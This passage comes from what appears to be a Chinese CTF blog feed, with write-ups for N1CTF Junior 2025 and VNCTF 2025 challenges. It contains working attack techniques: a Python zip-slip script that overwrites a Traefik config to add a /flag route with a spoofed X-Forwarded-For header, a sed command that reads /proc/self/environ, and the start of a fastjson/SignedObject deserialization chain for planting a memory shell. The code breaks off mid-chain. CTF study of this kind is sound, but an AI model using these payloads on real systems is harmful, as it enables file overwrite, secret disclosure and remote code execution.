punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">)</span><span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">&#123;</span>flag <span class="token operator">=</span> <span class="token string">"flag&#123;testflag&#125;"</span><span class="token punctuation">&#125;</span>c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusOK<span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/public/index"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span><span class="token function">HTML</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusOK<span class="token punctuation">,</span> <span class="token string">"index.html"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/public/upload"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>file<span class="token punctuation">,</span> err <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">FormFile</span><span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"File upload failed"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>randomFolder <span class="token operator">:=</span> <span class="token function">randFileName</span><span class="token punctuation">(</span><span class="token punctuation">)</span>destDir <span class="token operator">:=</span> filepath<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span>uploadDir<span class="token punctuation">,</span> randomFolder<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">MkdirAll</span><span class="token punctuation">(</span>destDir<span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"Failed to create directory"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>zipFilePath <span class="token operator">:=</span> filepath<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span>uploadDir<span class="token punctuation">,</span> randomFolder<span class="token operator">+</span><span class="token string">".zip"</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">SaveUploadedFile</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> zipFilePath<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"Failed to save uploaded file"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> err <span class="token operator">:=</span> <span class="token function">unzipFile</span><span class="token punctuation">(</span>zipFilePath<span class="token punctuation">,</span> destDir<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"Failed to unzip file"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"File uploaded and extracted successfully to %s"</span><span class="token punctuation">,</span> destDir<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":8080"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>功能点就一个文件上传解压</p><br><p><a href="https://github.com/jphetphoumy/traefik-CVE-2024-45410-poc">https://github.com/jphetphoumy/traefik-CVE-2024-45410-poc</a></p><p><a href="https://github.com/traefik/traefik/security/advisories/GHSA-62c8-mh53-4cqv">https://github.com/traefik/traefik/security/advisories/GHSA-62c8-mh53-4cqv</a></p><p>traefik v3.2.3 版本对不上</p><p>dynamic.yml</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># Dynamic configuration</span><span class="token key atrule">http</span><span class="token punctuation">:</span>  <span class="token key atrule">services</span><span class="token punctuation">:</span>    <span class="token key atrule">proxy</span><span class="token punctuation">:</span>      <span class="token key atrule">loadBalancer</span><span class="token punctuation">:</span>        <span class="token key atrule">servers</span><span class="token punctuation">:</span>          <span class="token punctuation">-</span> <span class="token key atrule">url</span><span class="token punctuation">:</span> <span class="token string">"http://127.0.0.1:8080"</span>  <span class="token key atrule">routers</span><span class="token punctuation">:</span>    <span class="token key atrule">index</span><span class="token punctuation">:</span>      <span class="token key atrule">rule</span><span class="token punctuation">:</span> Path(`/public/index`)      <span class="token key atrule">entrypoints</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>web<span class="token punctuation">]</span>      <span class="token key atrule">service</span><span class="token punctuation">:</span> proxy    <span class="token key atrule">upload</span><span class="token punctuation">:</span>      <span class="token key atrule">rule</span><span class="token punctuation">:</span> Path(`/public/upload`)      <span class="token key atrule">entrypoints</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>web<span class="token punctuation">]</span>      <span class="token key atrule">service</span><span class="token punctuation">:</span> proxy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>猜测还是要从文件上传入手，利用 zipslip 实现目录穿越文件覆盖，参考：<a href="https://saucer-man.com/information_security/364.html">https://saucer-man.com/information_security/364.html</a></p><p>ai 改一个 dynamic.yml，添加 &#x2F;flag 路由，并且使用中间件处理发送 xff 请求头</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># Dynamic configuration</span><span class="token key atrule">http</span><span class="token punctuation">:</span>  <span class="token key atrule">services</span><span class="token punctuation">:</span>    <span class="token key atrule">proxy</span><span class="token punctuation">:</span>      <span class="token key atrule">loadBalancer</span><span class="token punctuation">:</span>        <span class="token key atrule">servers</span><span class="token punctuation">:</span>          <span class="token punctuation">-</span> <span class="token key atrule">url</span><span class="token punctuation">:</span> <span class="token string">"http://127.0.0.1:8080"</span>    <span class="token key atrule">routers</span><span class="token punctuation">:</span>    <span class="token key atrule">index</span><span class="token punctuation">:</span>      <span class="token key atrule">rule</span><span class="token punctuation">:</span> Path(`/public/index`)      <span class="token key atrule">entrypoints</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>web<span class="token punctuation">]</span>      <span class="token key atrule">service</span><span class="token punctuation">:</span> proxy    <span class="token key atrule">upload</span><span class="token punctuation">:</span>      <span class="token key atrule">rule</span><span class="token punctuation">:</span> Path(`/public/upload`)      <span class="token key atrule">entrypoints</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>web<span class="token punctuation">]</span>      <span class="token key atrule">service</span><span class="token punctuation">:</span> proxy    <span class="token key atrule">flag</span><span class="token punctuation">:</span>      <span class="token key atrule">rule</span><span class="token punctuation">:</span> Path(`/flag`)      <span class="token key atrule">entrypoints</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>web<span class="token punctuation">]</span>      <span class="token key atrule">service</span><span class="token punctuation">:</span> proxy      <span class="token key atrule">middlewares</span><span class="token punctuation">:</span>        <span class="token punctuation">-</span> add<span class="token punctuation">-</span>header  <span class="token key atrule">middlewares</span><span class="token punctuation">:</span>    <span class="token key atrule">add-header</span><span class="token punctuation">:</span>      <span class="token key atrule">headers</span><span class="token punctuation">:</span>        <span class="token key atrule">customRequestHeaders</span><span class="token punctuation">:</span>          <span class="token key atrule">X-Forwarded-For</span><span class="token punctuation">:</span> <span class="token string">"127.0.0.1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成压缩包</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token comment"># the name of the zip file to generate</span>zf <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">'out.zip'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token comment"># the name of the malicious file that will overwrite the origial file (must exist on disk)</span>fname <span class="token operator">=</span> <span class="token string">'dynamic.yml'</span><span class="token comment">#destination path of the file</span>zf<span class="token punctuation">.</span>write<span class="token punctuation">(</span>fname<span class="token punctuation">,</span> <span class="token string">'../../../../../app/.config/dynamic.yml'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传，此时的 dynamic.yml 就是我们构造的配置文件了</p><p>直接访问 &#x2F;flag 即可</p><p><img src="/blog/2025/02/09/N1CTF-Junior-2025/image-20250210214233462.png" alt="image-20250210214233462"></p><hr><h1 id="EasyDB（Unsolved）"><a href="#EasyDB（Unsolved）" class="headerlink" title="EasyDB（Unsolved）"></a>EasyDB（Unsolved）</h1><p>代码逻辑十分简单，就一个登录登出，账密 admin:admin</p><p>然后就是 jdbc</p><p>不会</p><hr><h1 id="display（Unsolved）"><a href="#display（Unsolved）" class="headerlink" title="display（Unsolved）"></a>display（Unsolved）</h1><blockquote><p>用iframe嵌入子页面可以重新唤起DOM解析器解析script标签</p></blockquote><p>短短一行限制：<code>const csp = &quot;script-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;;&quot;;</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;比隔壁好打（&lt;/p&gt;
&lt;p&gt;&lt;del&gt;我要是大一就好了&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/blog/2025/02/09/N1CTF-Junior-2025/image-20250210232233018.png&quot; alt=&quot;image-20250210232233018&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>VNCTF2025</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/02/08/VNCTF2025/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/02/08/VNCTF2025/</id>
    <published>2025-02-08T02:21:47.000Z</published>
    <updated>2025-02-21T14:20:42.177Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>完 全 败 北</p><p>去年是遗憾，今年是惨败</p><p>第三年了，本以为今年能打出一个比较满意的成绩，结果web直接爆零了</p><p>参考：</p><p><a href="https://www.cnblogs.com/LAMENTXU/articles/18705991">https://www.cnblogs.com/LAMENTXU/articles/18705991</a></p><p><a href="http://www.bmth666.cn/2025/02/10/2025-VNCTF-ez-emlog%E5%A4%8D%E7%8E%B0/">http://www.bmth666.cn/2025/02/10/2025-VNCTF-ez-emlog%E5%A4%8D%E7%8E%B0/</a></p><span id="more"></span><hr><h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><h2 id="欢迎！"><a href="#欢迎！" class="headerlink" title="欢迎！"></a>欢迎！</h2><blockquote><p>做不出可以问DeepSeek R1</p></blockquote><p>给了个sed命令执行， 我们可控的位置在替换字符和读取的文件名</p><p>R1启动！使用<code>&amp;</code>保留匹配的内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sed</span> <span class="token string">'s/&#123;.*&#125;/&amp;/g'</span> /proc/self/environ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flag：<code>VNCTF&#123;wElcome-ANd_H4VE-@-g0OD_TIme_Qfx0BkjJU3SrA39agEv7P3f&#125;</code></p><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="javaGuide（复现）"><a href="#javaGuide（复现）" class="headerlink" title="javaGuide（复现）"></a>javaGuide（复现）</h2><p>过滤：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">resolveClass</span><span class="token punctuation">(</span><span class="token class-name">ObjectStreamClass</span> desc<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> className <span class="token operator">=</span> desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> denyClasses <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax"</span><span class="token punctuation">,</span> <span class="token string">"javax.management"</span><span class="token punctuation">,</span> <span class="token string">"com.fasterxml.jackson"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> var5 <span class="token operator">=</span> denyClasses<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var5 <span class="token operator">=</span> denyClasses<span class="token punctuation">;</span>    <span class="token keyword">int</span> var6 <span class="token operator">=</span> denyClasses<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> var7 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var7 <span class="token operator">&lt;</span> var6<span class="token punctuation">;</span> <span class="token operator">++</span>var7<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> denyClass <span class="token operator">=</span> var5<span class="token punctuation">[</span>var7<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>denyClass<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidClassException</span><span class="token punctuation">(</span><span class="token string">"Unauthorized deserialization attempt"</span><span class="token punctuation">,</span> className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>控制器：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">IndexController</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"hello"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/deser"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> payload<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">MyObjectInputStream</span> myObjectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>decode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            myObjectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">"ok"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvalidClassException</span> var4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> var4<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var5<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var5<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">"exception"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很明显是要在不用 com.sun.org.apache.xalan.internal.xsltc.trax , javax.management , com.fasterxml.jackson 的情况下打java反序列化，这ban的都是 templates 和 jackson 链，还有 BadAttributeValueExpException 这个入口</p><p>看一下有什么依赖</p><p><img src="/blog/2025/02/08/VNCTF2025/image-20250208104311548.png" alt="image-20250208104311548"></p><p>没cc也是java反序列化的第一步吗（</p><p>fastjson1.2.83不出网，还是个高版本要打内存马</p><p>到现在我的java还是依托，太难了，学一点忘一点。。</p><br><p>好吧此事在 CISCN2024solonMaster 中亦有记载，这次选择 eventListenerList 链：<a href="https://xz.aliyun.com/news/15977">https://xz.aliyun.com/news/15977</a></p><p>使用 eventListenerList 触发 toString</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">EventListenerList</span><span class="token class-name">UndoManager</span>#<span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">Vector</span>#<span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>BadAttributeValueExpException 没了就 XString，templates 没了就得二次反序列化</p><p>不出网打内存马，springboot 2.7.11 打那个 2.6.0+ 版本的内存马即可，注意包名</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSONArray</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xpath<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>objects<span class="token punctuation">.</span></span><span class="token class-name">XString</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>aop<span class="token punctuation">.</span>target<span class="token punctuation">.</span></span><span class="token class-name">HotSwappableTargetSource</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span><span class="token class-name">EventListenerList</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span>undo<span class="token punctuation">.</span></span><span class="token class-name">UndoManager</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Array</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">KeyPair</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">KeyPairGenerator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">Signature</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">SignedObject</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Vector</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EXP</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">TemplatesImpl</span> tpl <span class="token operator">=</span> <span class="token class-name">Utils</span><span class="token punctuation">.</span><span class="token function">memTemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">JSONArray</span> jsonArray <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        jsonArray<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>tpl<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HotSwappableTargetSource</span> h1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HotSwappableTargetSource</span><span class="token punctuation">(</span>jsonArray<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HotSwappableTargetSource</span> h2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HotSwappableTargetSource</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">XString</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap <span class="token operator">=</span> <span class="token function">makeMap</span><span class="token punctuation">(</span>h1<span class="token punctuation">,</span>h2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span> hashMap1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashMap1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tpl<span class="token punctuation">,</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">KeyPairGenerator</span> kpg <span class="token operator">=</span> <span class="token class-name">KeyPairGenerator</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        kpg<span class="token punctuation">.</span><span class="token function">initialize</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">KeyPair</span> kp <span class="token operator">=</span> kpg<span class="token punctuation">.</span><span class="token function">generateKeyPair</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">SignedObject</span> signedObject<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">SignedObject</span><span class="token punctuation">(</span>hashMap1<span class="token punctuation">,</span> kp<span class="token punctuation">.</span><span class="token function">getPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Signature</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token 